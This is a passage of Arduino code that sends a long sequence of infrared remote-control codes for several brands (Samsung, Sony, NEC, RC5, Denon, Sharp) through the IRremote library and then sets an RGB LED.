    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x707, 0x98, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    //Serial.println("IrSender.sendSamsung(0x707, 0x98, 1);");
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x1, 0x6D, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x1, 0x6D, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x1, 0x6D, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x1, 0x10, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x8, 0xD7, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendRC5(0x1, 0xC, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x4664, 0x5D, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x20, 0x52, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xBF00, 0xD, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendRC5(0x3, 0xC, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xBF00, 0x0, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x1717, 0x14, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendRC5(0x0, 0xC, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xA0, 0x5F, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x38, 0x12, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    //Serial.println(" IrSender.sendNEC(0x38, 0x12, 1);");
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x1, 0x2E, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x1, 0x2E, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x1, 0x2E, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x1, 0x2F, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x1, 0x2F, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x1, 0x2F, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xC7EA, 0x97, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x4040, 0xA, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x0, 0x1A, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x28, 0xB, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x80, 0x12, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xBD00, 0x1, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendDenon(0x1, 0x16, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    //Serial.println("IrSender.sendDenon(0x1, 0x16, 1);");
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSharp(0x1, 0xE9, 2);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x40, 0x12, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x3E3E, 0xC, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xF404, 0x8, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x40, 0x12, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    //Serial.println("IrSender.sendNEC(0x40, 0x12, 1);");
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x7F00, 0x1E, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xA0, 0x1C, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x80, 0x82, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    //Serial.println("IrSender.sendNEC(0x80, 0x82, 1);");
    IrSender.sendPulseDistanceWidth(38, 1150, 500, 700, 1450, 700, 500, 0x356, 10, PROTOCOL_IS_LSB_FIRST, 150, 6);
    IrSender.sendPulseDistanceWidth(38, 4000, 4050, 450, 2050, 450, 1050, 0xAB054F, 24, PROTOCOL_IS_LSB_FIRST, 150, 1);
    //Serial.println("DONE");

    analogWrite (Led_Red, 0);
    analogWrite (Led_Blue, 255);
    analogWrite (Led_Green, 0);

  }
